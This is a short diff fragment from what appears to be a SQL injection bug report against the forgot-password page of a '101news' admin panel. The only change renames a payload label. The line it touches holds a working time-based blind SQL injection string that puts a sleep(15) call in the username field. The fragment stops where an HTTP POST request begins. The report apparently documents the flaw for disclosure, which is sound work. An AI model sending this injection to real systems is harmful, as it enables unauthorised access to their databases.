@@ -40,7 +40,7 @@ The server's response time is 10 seconds
 
 ![image](https://github.com/PEOIzEve/bug_report/blob/main/sql1.png)
 
-Payload1:username=a' and (select 1 from (select(sleep(15)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=
+Payload2:username=a' and (select 1 from (select(sleep(15)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=
 
 ```
 POST /101news/admin/forgot-password.php HTTP/1.1
